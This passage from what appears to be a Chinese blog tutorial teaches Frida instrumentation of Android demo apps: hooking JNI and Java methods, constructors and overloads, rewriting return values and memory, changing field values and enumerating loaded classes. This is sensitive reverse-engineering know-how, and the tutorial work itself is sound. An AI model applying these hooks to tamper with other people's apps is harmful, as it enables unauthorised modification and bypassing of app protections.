punctuation\">)</span><span class=\"token punctuation\">;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"打印这段字符串：\"</span> <span class=\"token operator\">+</span> strAddress<span class=\"token punctuation\">.</span><span class=\"token function\">readCString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"读16字节：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>strAddress<span class=\"token punctuation\">.</span><span class=\"token function\">readByteArray</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"写入...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            Memory<span class=\"token punctuation\">.</span><span class=\"token function\">protect</span><span class=\"token punctuation\">(</span>strAddress<span class=\"token punctuation\">,</span> Process<span class=\"token punctuation\">.</span>pageSize<span class=\"token punctuation\">,</span> <span class=\"token string\">\"rw-\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//修改内存页属性后再写入</span>\n            strAddress<span class=\"token punctuation\">.</span><span class=\"token function\">writeUtf8String</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x86demo Hacked\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//内存写入字符串,该方法末尾会自动添加'\\0'</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\r\\n打印这段字符串：\"</span> <span class=\"token operator\">+</span> strAddress<span class=\"token punctuation\">.</span><span class=\"token function\">readCString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"读16字节：\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>strAddress<span class=\"token punctuation\">.</span><span class=\"token function\">readByteArray</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">var</span> clazz <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.example.x86demo.MainActivity\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    clazz<span class=\"token punctuation\">.</span>onCreate<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hook MainActivity onCreate()...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// hookMem();</span>\n        <span class=\"token function\">hookByName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span>arguments<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">hookByName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">const</span> address <span class=\"token operator\">=</span> Module<span class=\"token punctuation\">.</span><span class=\"token function\">findExportByName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libnative-lib.so\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Java_com_example_x86demo_MainActivity_stringFromJNI\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            Interceptor<span class=\"token punctuation\">.</span><span class=\"token function\">attach</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">onEnter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">args</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"onEnter...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">onLeave</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">retval</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> \n                    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"onLeave...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">var</span> env <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span>vm<span class=\"token punctuation\">.</span><span class=\"token function\">getEnv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">var</span> jstrings <span class=\"token operator\">=</span> env<span class=\"token punctuation\">.</span><span class=\"token function\">newStringUtf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hacked!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    retval<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>jstrings<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"retval:\"</span><span class=\"token punctuation\">,</span>retval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 函数返回值</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"NOt FOUND!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    \n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>最终效果如下：</p>\n<img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231004224219956.png\" alt=\"image-20231004224219956\" style=\"zoom: 80%;\">\n\n<h2 id=\"Frida-Hook-Java层函数\"><a href=\"#Frida-Hook-Java层函数\" class=\"headerlink\" title=\"Frida Hook Java层函数\"></a>Frida Hook Java层函数</h2><h3 id=\"Hook一般java层函数\"><a href=\"#Hook一般java层函数\" class=\"headerlink\" title=\"Hook一般java层函数\"></a>Hook一般java层函数</h3><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">Java<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> clazz <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zyc.fridademo.Calc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    clazz<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">p1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hook开始...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"原p1=\"</span><span class=\"token operator\">+</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hook修改参数...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        p1<span class=\"token operator\">+=</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"现p1=\"</span><span class=\"token operator\">+</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Hook构造函数\"><a href=\"#Hook构造函数\" class=\"headerlink\" title=\"Hook构造函数\"></a>Hook构造函数</h3><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">Java<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> clazz <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zyc.fridademo.Calc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    clazz<span class=\"token punctuation\">.</span>$init<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">p1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hook构造开始...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"原p1=\"</span><span class=\"token operator\">+</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        p1<span class=\"token operator\">+=</span><span class=\"token number\">200</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"现p1=\"</span><span class=\"token operator\">+</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">$init</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Hook重载函数\"><a href=\"#Hook重载函数\" class=\"headerlink\" title=\"Hook重载函数\"></a>Hook重载函数</h3><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 由于Calc中有add(int num1)和add(int num1,String num2)，像普通函数那样Hook是会报错的，涉及到重载就要用到 overload() ：</span>\n<span class=\"token comment\">// 这里按照传入的参数类型区分二者的差异</span>\nJava<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> clazz <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zyc.fridademo.Calc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    clazz<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">.</span><span class=\"token function\">overload</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"int\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hook add(int num1)...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">888</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    clazz<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">.</span><span class=\"token function\">overload</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"int\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"java.lang.String\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hook add(int num1,String num2)...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">999</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 也可以通过遍历重载函数的形似\t</span>\nJava<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> clazz <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zyc.fridademo.Calc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">var</span> count <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">.</span>overloads<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>count<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        clazz<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">.</span>overloads<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            arguments<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>arguments<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>arguments<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">.</span><span class=\"token function\">apply</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span>arguments<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"重写Tosat\"><a href=\"#重写Tosat\" class=\"headerlink\" title=\"重写Tosat\"></a>重写Tosat</h3><p>​\t参考这个例子能看到，js可以完全重写Android java层的代码。</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">Java<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// hook类: MainActivity</span>\n  <span class=\"token keyword\">var</span> MainActivity <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.yashu.aaaaaaaaaaaaaaaaaaaaaa.MainActivity\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// hook方法: MainActivity.onCreate</span>\n  MainActivity<span class=\"token punctuation\">.</span>onCreate<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">savedInstanceState</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"enter onCreate\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 不打断程序, 该执行的还要执行</span>\n    <span class=\"token comment\">// 执行this.onCreate, 且传参</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span>savedInstanceState<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// 获得Toast组件</span>\n  <span class=\"token keyword\">var</span> Toast <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"android.widget.Toast\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> makeText <span class=\"token operator\">=</span> Toast<span class=\"token punctuation\">.</span>makeText<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> String <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.String\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// 函数重载, 设置参数类型</span>\n  makeText<span class=\"token punctuation\">.</span><span class=\"token function\">overload</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"android.content.Context\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"java.lang.CharSequence\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"int\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token parameter\">context<span class=\"token punctuation\">,</span>\n    content<span class=\"token punctuation\">,</span>\n    time</span>\n  <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"修改toast内容\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 设置字符串重复次数</span>\n    <span class=\"token keyword\">var</span> content <span class=\"token operator\">=</span> <span class=\"token string\">\"牙叔教程 超级棒棒\\n\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">repeat</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 实例化字符串</span>\n    <span class=\"token keyword\">var</span> hookContent <span class=\"token operator\">=</span> String<span class=\"token punctuation\">.</span>$<span class=\"token keyword\">new</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 可以hook, 但是不能打断原先的程序, 原来该做什么, 还要继续做下去</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">makeText</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">,</span> hookContent<span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"访问类属性\"><a href=\"#访问类属性\" class=\"headerlink\" title=\"访问类属性\"></a>访问类属性</h3><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 类的属性可通过 .属性名.value 访问。如果有函数与属性名相同，则需要使用下划线方式 ._属性名.value 访问。</span>\nJava<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> clazz <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zyc.fridademo.MainActivity\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">var</span> calc <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zyc.fridademo.Calc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    clazz<span class=\"token punctuation\">.</span>onCreate<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hook MainActivity onCreate()...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> myCalc <span class=\"token operator\">=</span> calc<span class=\"token punctuation\">.</span>$<span class=\"token keyword\">new</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>myCalc<span class=\"token punctuation\">.</span>base<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"修改一下base...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        myCalc<span class=\"token punctuation\">.</span>base<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> <span class=\"token number\">88</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>myCalc<span class=\"token punctuation\">.</span>base<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span>arguments<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"遍历已加载的类和方法\"><a href=\"#遍历已加载的类和方法\" class=\"headerlink\" title=\"遍历已加载的类和方法\"></a>遍历已加载的类和方法</h3><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">Java<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    Java<span class=\"token punctuation\">.</span><span class=\"token function\">enumerateLoadedClasses</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n        <span class=\"token function-variable function\">onMatch</span> <span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name<span class=\"token punctuation\">,</span>handle</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zyc.fridademo\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">var</span> clazz <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">var</span> methods <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span>class<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethods</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token 